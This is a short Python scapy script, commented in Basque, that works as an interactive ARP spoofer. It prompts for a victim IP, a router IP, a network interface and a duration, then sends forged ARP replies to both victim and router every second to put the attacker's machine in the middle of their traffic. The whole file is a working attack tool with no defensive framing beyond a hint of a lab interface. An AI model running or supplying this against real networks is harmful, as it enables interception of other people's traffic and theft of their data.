from scapy.all import ARP, Ether, sendp
import time
import os

# Honek biktimari esaten dio gure MAC-a routerrarena dela
# eta routerrari esaten dio gure MAC-a biktimaren dela
def arp_pakete_bidali(helburua, faltsua, interfazea):
    pakete = ARP(op=2, pdst=helburua, psrc=faltsua)  # op=2 jarri behar da bestela ez du funtzionatzen (ez dakit oso ongi zergatik)
    #paketea sareko pakete batean enkapsulatuko da eta bidaliko da broadcast helbidera
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/pakete, verbose=False, iface=interfazea)  #verbose-a kentzen dut pantaila ez betetzeko

os.system("clear")
print("--------------------------------")
print("|       ARP SPOOFER            |")
print("--------------------------------")
biktima_ip = input("Biktimaren IPa (adib: 10.0.0.10): ")
router_ip  = input("Routerraren IPa (adib: 10.0.0.1): ")
interfazea = input("Ze interfaz (tap0): ")
segundoak  = input("Zenbat segundoz? (adib: 30): ")

print(f"\nARP Spoofing hasten da...")
print(f"Biktima: {biktima_ip} <--> Router: {router_ip}")
print("CTRL+C gelditzeko\n")

try:
    for i in range(int(segundoak)):
        arp_pakete_bidali(biktima_ip, router_ip, interfazea)  # biktimari bidaltzen diot
        arp_pakete_bidali(router_ip, biktima_ip, interfazea)  # routerrari ere bidaltzen diot, biak behar dira
        print(f"[+] Paketeak bidali: {i+1}")
        time.sleep(1)  # segundu bat itxaroten dut, bestela paketeak oso azkar bidaltzen ditu eta kolapsatzen da
except KeyboardInterrupt:
    print("\nGelditu da")

print("ARP Spoofing amaituta")